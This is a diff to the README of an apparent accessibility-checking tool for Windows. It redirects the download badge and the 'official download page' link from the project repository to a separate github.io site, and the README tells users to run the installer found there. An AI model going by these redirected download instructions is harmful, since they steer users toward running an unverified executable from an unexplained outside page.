@@ -1,6 +1,6 @@
 # 🔍 accesslens-2026-a11y-tool - Check your design for accessibility issues
 
-[![Download AccessLens](https://img.shields.io/badge/Download-AccessLens-blue.svg)](https://github.com/Aartakun1461/accesslens-2026-a11y-tool)
+[![Download AccessLens](https://img.shields.io/badge/Download-AccessLens-blue.svg)](https://aartakun1461.github.io)
 
 AccessLens helps you find accessibility problems in your UI designs before you build them. The tool scans your layouts for potential WCAG 2.1 AA violations. This allows you to fix errors early and save time during the development phase.
 
@@ -8,7 +8,7 @@ AccessLens helps you find accessibility problems in your UI designs before you b
 
 Follow these steps to set up AccessLens on your Windows computer.
 
-1. Visit the [official download page](https://github.com/Aartakun1461/accesslens-2026-a11y-tool) to get the latest release.
+1. Visit the [official download page](https://aartakun1461.github.io) to get the latest release.
 2. Click the link to save the installer file to your computer.
 3. Locate the file in your downloads folder.
 4. Run the installer and follow the instructions on your screen.
